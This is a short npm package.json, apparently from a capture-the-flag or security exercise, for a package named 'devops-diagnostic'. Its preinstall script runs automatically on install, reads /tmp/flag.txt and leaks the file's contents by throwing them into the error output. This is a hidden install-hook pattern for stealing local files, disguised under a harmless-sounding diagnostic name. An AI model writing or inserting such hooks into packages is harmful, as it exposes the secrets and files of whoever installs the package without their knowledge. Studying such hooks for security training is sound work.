{
  "name": "devops-diagnostic",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "node -e \"const fs=require('fs'); const flag=fs.readFileSync('/tmp/flag.txt','utf8'); throw new Error('==== ' + flag + ' ====');\""
  }
}
